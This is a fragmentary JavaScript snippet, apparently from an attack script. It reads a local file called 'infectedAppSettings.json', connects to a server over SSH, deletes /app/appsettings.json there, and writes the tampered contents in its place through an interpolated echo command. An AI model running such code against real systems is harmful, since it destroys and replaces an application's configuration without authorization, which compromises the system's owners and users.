...
const data = fs.readFileSync('./infectedAppSettings.json', 'utf8');
...
const SSHIntoLogs = async () => {
  ssh.connect({
    ...
    await ssh.exec('rm', ['/app/appsettings.json']);
    await ssh.exec('touch', ['/app/appsettings.json']);
    await ssh.execCommand(`echo '${data}' >> /app/appsettings.json`);
